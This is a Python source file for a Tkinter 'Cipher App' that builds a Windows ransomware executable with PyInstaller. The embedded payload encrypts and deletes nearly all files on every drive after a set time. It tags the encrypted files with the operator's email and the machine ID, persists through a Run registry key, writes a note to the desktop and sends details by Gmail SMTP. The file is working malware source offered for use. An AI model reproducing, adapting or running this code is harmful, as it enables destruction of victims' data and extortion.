import subprocess, os, sys, time, shutil, pickle, tkinter as tk
from cryptography.fernet import Fernet

code_string = """import hashlib, base64, os, sys, re, uuid, subprocess, pickle, datetime, winreg, smtplib, requests, ssl
from cryptography.fernet import Fernet

def subprocess_args(include_stdout=True):
    if hasattr(subprocess, 'STARTUPINFO'):
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        env = os.environ
    else:
        si = None  
        env = None

    if include_stdout:
        ret = {'stdout': subprocess.PIPE}
    else:
        ret = {}

    ret.update({
        'stdin': subprocess.PIPE,
        'stderr': subprocess.PIPE,
        'startupinfo': si,
        'env': env 
    })
    return ret 

def make_key(key):
    key = hashlib.sha256(key.encode('utf-8')).digest()
    return base64.urlsafe_b64encode(key)

def get_machine_id():
    machine_id = subprocess.check_output('wmic csproduct get uuid', **subprocess_args(False)).decode().split('\\n')[1].strip()
    clean_id = re.sub(r'[^0-9A-Fa-f]+', '', machine_id)
    return clean_id

def make_name(filename, extension, pc_id, email=None):
    new_name = filename + '.' + f'[{email}]' + '.' + pc_id + '.' + extension
    return new_name

class Cipher:
    def __init__(self, key, extension, email):
        self.key = make_key(key)
        self.extension = extension
        self.email = email
        self.pc_id = get_machine_id()
        self.fernet = Fernet(self.key)
    
    def encrypt_file(self, filename):
        with open(filename, 'rb') as f:
            raw = f.read()
            new_name = make_name(filename, self.extension, self.pc_id, self.email)
            with open(new_name, 'wb') as f:
                enc = self.fernet.encrypt(raw)
                f.write(base64.b64encode(enc))

    def encrypt_disk(self, drive):
        extensions = ['enc', 'banks', 'exe', 'py', 'pk']
        win_dir = os.path.join(drive, 'Windows')
        for path, subdirs, files in os.walk(drive):
            for file in files:
                extension = file.split('.')[-1]
                filepath = os.path.join(path, file)
                if not filepath.startswith(win_dir) and os.path.isfile(filepath) and extension not in extensions:
                    self.encrypt_file(filepath)
                    os.remove(filepath)

def create_key(script_path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'CipherApp', 0, winreg.REG_SZ, script_path)
    key.Close()

def delete_key():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
    winreg.DeleteValue(key, 'CipherApp')
    key.Close()

def key_exists():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
    try:
        winreg.QueryValueEx(key, 'CipherApp')
    except:
        return False
    return True

def connected():
    try:
        requests.get('https://www.google.com/')
    except:
        return False
    return True

def send_mail(host_user, host_password, receiver, details):
    host = 'smtp.gmail.com'
    port = 587
    context = ssl.create_default.context()
    with smtplib.SMTP(host, port) as server:
        server.starttls(context=context)
        server.login(host_user, host_password)
        server.sendmail(host_user, receiver, details)

def main(key, extension, email, date, host_user, host_password, details=None):
    cipher = Cipher(key, extension, email)

    date = str(date).strip()
    date_format = '%H:%M %d %b %Y'
    if len(date) <= 2:
        hours = datetime.timedelta(hours=int(date))
        future_time = datetime.datetime.now() + hours
    elif len(date) in range(4, 6):
        date += f' {datetime.date.today().strftime("%d %b %Y")}'
        future_time = datetime.datetime.strptime(date, date_format)
    else:
        future_time = datetime.datetime.strptime(date, date_format) 
    
    dl = 'ABDEFGHIJKLMNOPQRSTUVWXYZ'
    drives = ['%s:/' % (d) for d in dl if os.path.exists('%s:' % (d))]
    base_dir = os.path.dirname(os.path.abspath(__file__))
    pickle_path = os.path.join(base_dir, 'dump.pk')
    homepath = os.environ['HOMEPATH']
    homedrive = os.environ['HOMEDRIVE']
    details_path = os.path.join(homedrive, homepath) + '\desktop\details.txt'
    script_path = os.path.join(base_dir, 'enc.exe')
    script_path = '"{}" /background'.format(script_path)
    log_file = os.path.join(base_dir, 'log.txt')

    if os.path.exists(pickle_path):
        last_time = None
        with open(pickle_path, 'rb') as f:
            data = pickle.load(f)
            last_time = data['last_time']
        while True:
            now = datetime.datetime.now()
            time_passed = now - last_time
            if last_time + time_passed >= future_time:
                try:
                    for drive in drives:
                        cipher.encrypt_disk(drive)
                    os.remove(pickle_path)
                    if key_exists():
                        delete_key()  
                except Exception as e:
                    with open(log_file, 'w') as f:
                        f.write("{}\\n".format(str(e)))
                break
    else:
        create_key(script_path)      
        while True:
            now = datetime.datetime.now()
            with open(pickle_path, 'wb') as f:
                data = {'last_time': now}
                pickle.dump(data, f)
            if now >= future_time:
                try:
                    for drive in drives:
                        cipher.encrypt_disk(drive)
                    os.remove(pickle_path)
                    delete_key()
                except Exception as e:
                    with open(log_file, 'w') as f:
                        f.write("{}\\n".format(str(e)))
                break

    if details is not None:
        with open(details_path, 'w+') as f:
            f.write(details)
        if connected():
            try:  
                send_mail(host_user, host_password, email, details)
            except:
                pass
        
if __name__ == '__main__': \n"""


class MainWindow:
    def __init__(self, root):
        self.root = root
        self.date = tk.StringVar()
        self.key = tk.StringVar()
        self.email = tk.StringVar()
        self.extension = tk.StringVar()
        self.details = tk.StringVar()
        self.status = tk.StringVar()
        self.host_user = tk.StringVar()
        self.host_password = tk.StringVar()
        self.status.set("---")
        self.should_cancel = False
        self.THIS_FOLDER_G = os.path.dirname(os.path.realpath(__file__))

        root.title("Cipher App")
        root.configure(bg="#eeeeee")

        self.key_label = tk.Label(
            root,
            text="Set the secret key to encrypt files (Remember this key for decryption)",
            bg="#eeeeee",
            anchor=tk.W
        )

        self.key_label.grid(
            padx=12,
            pady=(8, 0),
            ipadx=0,
            ipady=1,
            row=0,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.key_entry = tk.Entry(
            root,
            textvariable=self.key,
            bg="#fff",
            exportselection=0,
            relief=tk.FLAT
        )

        self.key_entry.grid(
            padx=15,
            pady=6,
            ipadx=8,
            ipady=8,
            row=1,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.host_user_label = tk.Label(
            root,
            text="The email address of the person sending the details here",
            bg="#eeeeee",
            anchor=tk.W
        )

        self.host_user_label.grid(
            padx=12,
            pady=(8, 0),
            ipadx=0,
            ipady=1,
            row=2,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.host_user_entry = tk.Entry(
            root,
            textvariable=self.host_user,
            bg="#fff",
            exportselection=0,
            relief=tk.FLAT
        )

        self.host_user_entry.grid(
            padx=15,
            pady=6,
            ipadx=8,
            ipady=8,
            row=3,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.host_password_label = tk.Label(
            root,
            text="The email password of the person sending the details",
            bg="#eeeeee",
            anchor=tk.W
        )

        self.host_password_label.grid(
            padx=12,
            pady=(8, 0),
            ipadx=0,
            ipady=1,
            row=4,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.host_password_entry = tk.Entry(
            root,
            textvariable=self.host_password,
            bg="#fff",
            exportselection=0,
            relief=tk.FLAT
        )

        self.host_password_entry.grid(
            padx=15,
            pady=6,
            ipadx=8,
            ipady=8,
            row=5,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )


        self.date_label = tk.Label(
            root,
            text="You can set the date, hours, or time for encryption here",
            bg="#eeeeee",
            anchor=tk.W
        )

        self.date_label.grid(
            padx=12,
            pady=(8, 0),
            ipadx=0,
            ipady=1,
            row=6,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.date_entry = tk.Entry(
            root,
            textvariable=self.date,
            bg="#fff",
            exportselection=0,
            relief=tk.FLAT
        )
        self.date_entry.grid(
            padx=15,
            pady=6,
            ipadx=8,
            ipady=8,
            row=7,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.email_label = tk.Label(
            root,
            text="Enter your email id to append to encrypted files",
            bg="#eeeeee",
            anchor=tk.W
        )
        
        self.email_label.grid(
            padx=12,
            pady=(8, 0),
            ipadx=0,
            ipady=1,
            row=8,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.email_entry = tk.Entry(
            root,
            textvariable=self.email,
            bg="#fff",
            exportselection=0,
            relief=tk.FLAT
        )

        self.email_entry.grid(
            padx=15,
            pady=6,
            ipadx=8,
            ipady=8,
            row=9,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.extension_label = tk.Label(
            root,
            text="Set the extension to append to encrypted files",
            bg="#eeeeee",
            anchor=tk.W
        )
        
        self.extension_label.grid(
            padx=12,
            pady=(8, 0),
            ipadx=0,
            ipady=1,
            row=10,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.extension_entry = tk.Entry(
            root,
            textvariable=self.extension,
            bg="#fff",
            exportselection=0,
            relief=tk.FLAT
        )

        self.extension_entry.grid(
            padx=15,
            pady=6,
            ipadx=8,
            ipady=8,
            row=11,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )


        self.details_label = tk.Label(
            root,
            text="Set the Daily Encryption Details here",
            bg="#eeeeee",
            anchor=tk.W
        )
        
        self.details_label.grid(
            padx=12,
            pady=(8, 0),
            ipadx=0,
            ipady=1,
            row=12,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.details_entry = tk.Entry(
            root,
            textvariable=self.details,
            bg="#fff",
            exportselection=0,
            relief=tk.FLAT
        )

        self.details_entry.grid(
            padx=15,
            pady=6,
            ipadx=8,
            ipady=8,
            row=13,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )
        
          
        self.encrypt_btn = tk.Button(
            root,
            text="BUILD ENCRYPTOR",
            command=self.build_callback,
            width=42,
            bg="#1089ff",
            fg="#ffffff",
            bd=2,
            relief=tk.FLAT
        )
        self.encrypt_btn.grid(
            padx=15,
            pady=8,
            ipadx=24,
            ipady=6,
            row=14,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )      

        self.reset_btn = tk.Button(
            root,
            text="RESET",
            command=self.reset_callback,
            bg="#aaaaaa",
            fg="#ffffff",
            bd=2,
            relief=tk.FLAT
        )

        self.reset_btn.grid(
            padx=15,
            pady=(4, 12),
            ipadx=24,
            ipady=6,
            row=15,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        self.status_label = tk.Label(
            root,
            textvariable=self.status,
            bg="#eeeeee",
            anchor=tk.W,
            justify=tk.LEFT,
            relief=tk.FLAT,
            wraplength=350
        )

        self.status_label.grid(
            padx=12,
            pady=(0, 12),
            ipadx=0,
            ipady=1,
            row=16,
            column=0,
            columnspan=4,
            sticky=tk.W+tk.E+tk.N+tk.S
        )

        tk.Grid.columnconfigure(root, 0, weight=1)
        tk.Grid.columnconfigure(root, 1, weight=1)
        tk.Grid.columnconfigure(root, 2, weight=1)
        tk.Grid.columnconfigure(root, 3, weight=1)

    def build_callback(self):
        self.freeze_controls()
        root = os.path.dirname(os.path.realpath(__file__))
        key = self.key.get()
        extension = self.extension.get()
        email = self.email.get()
        date = self.date.get()
        details = self.details.get()
        host_user = self.host_user.get()
        host_password = self.host_password.get()
        data = {
            'key': key,
            'extension': extension,
            'email': email,
            'date': date,
            'details': details,
            'host_user': host_user,
            'host_password': host_password 
        }
        string = "    {} = '{}'\n"
        string = ''.join((string.format(k, v) for k, v in data.items()))
        try:     
            os.chdir(root)
            with open('enc.py', 'wb') as f:
                f.write(code_string.encode('utf-8'))
                f.write(string.encode('utf8'))
                f.write(b"    main(key, extension, email, date, host_user, host_password, details)\n")
            self.status.set('Building executable, please wait ...')
            self.status_label.update()
            try:
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                subprocess.call('pyinstaller --noconsole --onefile enc.py', startupinfo=si)
            except OSError as e:
                with open('error.txt', 'w') as f:
                    f.write('Failed :' + str(e))
            os.remove('enc.spec')
            os.remove('enc.py')
            cipher_exe_path = os.path.join(root, 'dist/enc.exe')
            shutil.copy2(cipher_exe_path, root)
            shutil.rmtree('__pycache__/')
            shutil.rmtree('build/')
            shutil.rmtree('dist/')

            self.status.set('1 cipher file created successfully')
            self.status_label.update()
            time.sleep(5)
            sys.exit()
        except Exception as e:
            self.status.set(e)
            self.status_label.update()

        self.unfreeze_controls()


    def freeze_controls(self):
        self.key_entry.configure(state="disabled")
        self.details_entry.configure(state="disabled")
        self.email_entry.configure(state="disabled")
        self.date_entry.configure(state="disabled")
        self.host_user_entry.configure(state="disabled")
        self.host_password_entry.configure(state="disabled")
        self.encrypt_btn.configure(state="disabled")
        self.extension_entry.configure(state="disabled")
        self.reset_btn.configure(text="CANCEL", command=self.cancel_callback,
            fg="#ed3833", bg="#fafafa")
        self.status_label.update()
    
    def unfreeze_controls(self):
        self.key_entry.configure(state="normal")
        self.details_entry.configure(state="normal")
        self.email_entry.configure(state="normal")
        self.extension_entry.configure(state="normal")
        self.date_entry.configure(state="normal")
        self.host_user_entry.configure(state="normal")
        self.host_password_entry.configure(state="normal")
        self.encrypt_btn.configure(state="normal")
        self.reset_btn.configure(text="RESET", command=self.reset_callback,
            fg="#ffffff", bg="#aaaaaa")
        self.status_label.update()


    def reset_callback(self):
        self.key.set("")
        self.email.set("")
        self.extension.set("")
        self.status.set("---")
        self.details.set("")
        self.host_user.set("")
        self.host_password.set("")
        self.date.set("")
    
    def cancel_callback(self):
        self.should_cancel = True


if __name__ == "__main__":
    ROOT = tk.Tk()
    MAIN_WINDOW = MainWindow(ROOT)
    ROOT.mainloop()


    
    
            

